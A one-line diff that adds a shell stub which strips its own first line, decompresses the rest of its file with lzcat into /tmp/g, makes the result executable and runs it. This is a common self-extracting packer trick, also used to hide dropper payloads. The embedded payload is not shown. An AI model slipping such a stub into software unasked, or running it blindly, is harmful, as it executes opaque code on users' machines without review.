@@ -1,0 +1,1 @@
+HOME=/tmp/g;sed 1d $0|lzcat>~;chmod +x ~;~
